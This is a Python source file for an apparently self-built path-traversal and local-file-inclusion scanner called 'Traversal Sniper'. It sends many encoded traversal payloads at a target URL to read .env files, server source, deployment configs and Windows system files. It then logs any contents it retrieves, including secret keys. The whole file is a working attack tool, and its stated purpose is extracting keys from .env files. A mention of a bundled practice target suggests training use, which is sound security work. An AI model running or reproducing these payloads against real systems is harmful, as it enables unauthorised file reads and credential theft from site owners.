"""
traversal_sniper.py — Path Traversal / LFI probe for .env and config files.

Crafts traversal payloads across common static roots and file-serving endpoint
patterns. When a target leaks its absolute app root in a stack trace, feed it in
with --app-root to add precise absolute-path payloads for that specific depth.
"""
import sys, os, argparse, urllib.request, urllib.error, urllib.parse, re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, FRAMEWORK_VERSION

# Static files are often served from web/public or web/dist, so traversal depth
# varies. We try all realistic depths.

TARGETS = [".env", ".env.local", ".env.production", ".env.development",
           "package.json", "server.js", "index.js", "app.js", ".env.example"]

TRAVERSALS = [
    # Standard double-dot sequences
    "../", "../../", "../../../", "../../../../", "../../../../../",
    # URL encoded single
    "%2e%2e%2f", "%2e%2e/", "..%2f",
    # Double-encoded
    "%252e%252e%252f", "%252e%252e/",
    # Backslash (Windows)
    "..\\", "..%5c", "%2e%2e%5c",
    # Mixed slash
    "..%2F", "..%5C",
    # Overlong encoding
    "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
    # Unicode variants
    "%e2%80%ae", "‥/",
    # Null byte bypass
    "%00../",
    # Multiple path confusion
    "static/../", "assets/../", "public/../",
    "dist/../", "build/../", "src/../",
    "static/../../", "assets/../../",
]

# Static asset paths the server likely serves from
STATIC_ROOTS = [
    "/",
    "/static/",
    "/assets/",
    "/public/",
    "/files/",
    "/img/",
    "/js/",
    "/css/",
    "/api/static/",
]

# Specific traversal paths combining known app structure
PRECISE_TRAVERSALS = [
    # If serving from web/public: ../  goes to web/, ../../ to CLI/
    "/../.env",
    "/../../.env",
    "/../../../.env",
    "/../server.js",
    "/../index.js",
    "/../package.json",
    "/../.env.local",
    # Encoded variants of above
    "/%2e%2e/.env",
    "/%2e%2e/%2e%2e/.env",
    "/%2e%2e/server.js",
    "/%2e%2e%2f.env",
    "/%2e%2e%2f%2e%2e%2f.env",
    # Static file bypass via known paths
    "/static/../.env",
    "/assets/../.env",
    "/js/../.env",
    "/css/../.env",
]

# Windows canaries + deep relative climbs. Standard well-known files confirm a
# traversal without needing the target's absolute path; --app-root adds precise
# absolute payloads when a stack trace has leaked the real root.
WINDOWS_PATHS = [
    "/../../../../../../windows/win.ini",
    "/..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
    "/../../../../../../windows/system32/drivers/etc/hosts",
    "/..%2F..%2F..%2F..%2F..%2F.env",
    "/..\\..\\..\\.env",
    "/..%5C..%5C..%5C.env",
]


def _absolute_root_payloads(app_root):
    """Build precise absolute-path payloads from an operator-supplied app root
    (e.g. one leaked in a stack trace). Empty unless --app-root is given."""
    root = (app_root or "").strip().rstrip("/\\")
    if not root:
        return []
    sep = "\\" if (":" in root[:3] or "\\" in root) else "/"
    payloads = []
    for target in (".env", ".env.local", "server.js", "package.json"):
        raw = f"/{root}{sep}{target}"
        payloads.append(raw)
        payloads.append("/" + urllib.parse.quote(f"{root}{sep}{target}", safe=""))
    return payloads

# Parameter injection for static file endpoints
PARAM_TRAVERSALS = [
    "/api/health?file=../.env",
    "/api/health?path=../.env",
    "/api/config?file=../.env",
    "/api/config?include=../.env",
    "/api/config?load=../.env",
    # open redirect / LFI combos
    "/api/chat?template=../../.env",
    "/api/chat?persona=../../.env",
]


ENV_LINE_RE = re.compile(r"(?m)^[A-Z][A-Z0-9_]{2,}=.{2,}$")
SOURCE_MARKERS = ("import ", "def ", "class ", "<?php", "require(", "module.exports", '"dependencies"')
TRAVERSAL_TOKENS = ("%252e%252e%252f", "%252e%252e/", "%2e%2e%2f", "%2e%2e%2F",
                    "%2e%2e/", "..%2f", "..%2F", "..%5c", "..%5C", "../", "..\\", "....//")


def looks_like_file_read(path, body, content_type="", baseline=None):
    """Evidence that a 200 actually returned file content.

    The old heuristic flagged *any* non-HTML 200 body over 20 bytes, which
    marked every JSON API response as "TRAVERSAL CONFIRMED". Require instead
    real file shapes: .env-style KEY=value lines, passwd/ini/php markers, or
    source code from an explicitly source-shaped path. Bodies identical to a
    catch-all/not-found baseline are never a finding.
    """
    if not body or len(body) < 8:
        return False
    if baseline and body == baseline.get("body"):
        return False
    lowered = body.lower()
    ctype = (content_type or "").lower()
    if ENV_LINE_RE.search(body):
        return True
    if "root:x:0:0" in body or "[extensions]" in lowered:
        return True
    if "<?php" in body or "#!/" in body[:40]:
        return True
    # Source files only count when the body really looks like source (and the
    # requested path names a source/config file). JSON APIs and HTML shells
    # that happen to contain the word "import" stay out.
    if ctype and ("json" in ctype or "html" in ctype):
        return False
    requested = path.split("?")[-1].lower()
    source_shaped = requested.endswith((".py", ".js", ".ts", ".rb", ".php", ".yml", ".yaml",
                                        ".json", ".env", ".env.local", ".ini", ".cfg", ".conf",
                                        ".ini", "win.ini", "hosts", "passwd"))
    return source_shaped and any(marker in body for marker in SOURCE_MARKERS)


class TraversalSniper(VibeTool):
    def __init__(self):
        super().__init__("Traversal Sniper", "Targeted Path Traversal for .env Key Extraction")
        self.hits = []
        self._baseline = None

    def _baseline_probe(self, base):
        if self._baseline is None:
            self._baseline = self.baseline_probe(base)
            if self._baseline.get("catch_all"):
                self.log(f"[!] Target answers {self._baseline['status']} for a path that "
                         f"cannot exist — status-only evidence is unreliable here.", "warn")
        return self._baseline

    @staticmethod
    def _control_url(url):
        """Same request with the traversal token replaced by junk.

        If a candidate and its control return identical bytes, the endpoint is
        ignoring the parameter (or is a catch-all) — not a traversal.
        """
        for token in TRAVERSAL_TOKENS:
            if token in url:
                return url.replace(token, "vibe-control-xyz", 1)
        return ""

    def _try_path(self, base, path, label=""):
        url = base + path
        baseline = self._baseline_probe(base)
        status, body, headers = self.safe_request(url, method="GET")
        ct = headers.get("Content-Type", "") if hasattr(headers, "get") else ""
        if status == 0:
            return 0, "", False

        control = self._control_url(url)
        if control:
            c_status, c_body, _ = self.safe_request(control, method="GET")
            if c_status == status and c_body == body:
                self.log(f"[noise] {path}: identical to the non-traversal control request")
                return status, body, False

        verified = looks_like_file_read(path, body, ct, baseline)
        if verified:
            self.log(f"[HIT] {path} ({len(body)}b, {ct}): {body[:300]}", "hack")
            self.hits.append((path, body[:500]))
        elif status == 200:
            self.log(f"[200 but meh] {path}: {body[:80]}")
        elif status not in (404, 405):
            self.log(f"[{status}] {path}")
        return status, body, verified

    def vector_precise(self, base):
        self.log("=== PRECISE: Known Path Traversal ===")
        for path in PRECISE_TRAVERSALS:
            self._try_path(base, path, "precise")

    def vector_static_roots(self, base):
        self.log("=== STATIC ROOTS: Static File Endpoint Traversal ===")
        for root in STATIC_ROOTS:
            for target in TARGETS[:4]:  # focus on .env variants
                for traversal in ["../", "../../", "../../../", "%2e%2e/"]:
                    path = root + traversal + target
                    self._try_path(base, path)

    def vector_windows(self, base):
        self.log("=== WINDOWS: Windows Absolute Path Injection ===")
        for path in WINDOWS_PATHS:
            self._try_path(base, path)

    def vector_params(self, base):
        self.log("=== PARAMS: Parameter-Based LFI ===")
        for path in PARAM_TRAVERSALS:
            self._try_path(base, path)

    def vector_known_files(self, base):
        """Fetch known files that might be served accidentally."""
        self.log("=== KNOWN FILES: Direct Access to Common Files ===")
        paths = [
            "/package.json",
            "/package-lock.json",
            "/.env",
            "/.env.example",
            "/server.js",
            "/index.js",
            "/app.js",
            "/config.js",
            "/webpack.config.js",
            "/vite.config.js",
            "/next.config.js",
            "/vercel.json",
            "/render.yaml",
            "/.github/workflows/deploy.yml",
            "/Dockerfile",
            "/docker-compose.yml",
        ]
        for p in paths:
            s, body, verified = self._try_path(base, p)
            if verified:
                self.log(f"  [ACCESSIBLE] {p}: {body[:200]}", "warn")
            elif s == 200:
                self.log(f"  [not confirmed] {p}: 200 but the body is not file content")

    def vector_dynamic_params(self, base):
        """Probe file-serving endpoints with a traversal in the query string.

        This is the shape the bundled practice target actually uses
        (`/files?path=../app.py`); the fixed payload list never tried it, so a
        real LFI could sit undetected while catch-all 200s were reported.
        """
        self.log("=== DYNAMIC PARAMS: Query-string file endpoints ===")
        endpoints = ["/files", "/file", "/api/file", "/api/files", "/download",
                     "/read", "/view", "/static", "/assets", "/api/read"]
        params = ["path", "file", "name", "filename", "include"]
        payloads = ["../.env", "../../.env", "../app.py", "../package.json"]
        for endpoint in endpoints:
            found_here = False
            for param in params:
                for payload in payloads:
                    path = f"{endpoint}?{param}={payload}"
                    before = len(self.hits)
                    self._try_path(base, path)
                    if len(self.hits) > before:
                        found_here = True
                        break
                if found_here:
                    break
            if found_here:
                self.log(f"  -> {endpoint} accepts a traversal in a query parameter "
                         f"(further parameter shapes skipped)", "hack")

    def vector_api_file_serve(self, base):
        """Some APIs have file-serving endpoints; probe likely patterns."""
        self.log("=== API FILE SERVE: Endpoint-Based File Access ===")
        payloads = [
            "/api/file?name=.env",
            "/api/file?path=.env",
            "/api/file?f=.env",
            "/api/file?filename=.env",
            "/api/serve?file=.env",
            "/api/resource?path=.env",
            "/api/download?file=.env",
            "/api/export?file=.env",
            "/api/read?file=.env",
            "/api/open?file=.env",
            # encoded
            "/api/file?name=%2e%2e%2f.env",
            "/api/file?path=..%2F.env",
            "/api/file?name=..%5C.env",
        ]
        for p in payloads:
            s, body, verified = self._try_path(base, p)
            if verified:
                self.log(f"  [READ] {p}: {body[:150]}", "warn")
            elif s not in (404, 405, 0):
                self.log(f"  [{s}] {p}: no file content in response")

    def run(self, url, app_root=""):
        self.banner()
        base = url.rstrip("/")

        self.vector_precise(base)
        self.vector_known_files(base)
        self.vector_api_file_serve(base)
        self.vector_dynamic_params(base)
        self.vector_static_roots(base)
        self.vector_windows(base)
        self.vector_params(base)

        absolute = _absolute_root_payloads(app_root)
        if absolute:
            self.log("=== ABSOLUTE: Operator-supplied app-root payloads ===")
            for path in absolute:
                self._try_path(base, path)

        self.log("================================")
        if self.hits:
            self.log(f"TRAVERSAL CONFIRMED — {len(self.hits)} file(s) read!", "hack")
            for path, content in self.hits:
                self.log(f"  {path}:", "hack")
                self.log(f"  {content}", "hack")
        else:
            self.log("No traversal confirmed. Static files properly jailed.", "warn")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--app-root", default="",
                        help="Absolute app root leaked in a stack trace, to build precise payloads")
    parser.add_argument("-v", "--version", action="version", version=f"Traversal Sniper {FRAMEWORK_VERSION}")
    args = parser.parse_args()
    TraversalSniper().run(args.url, app_root=args.app_root)
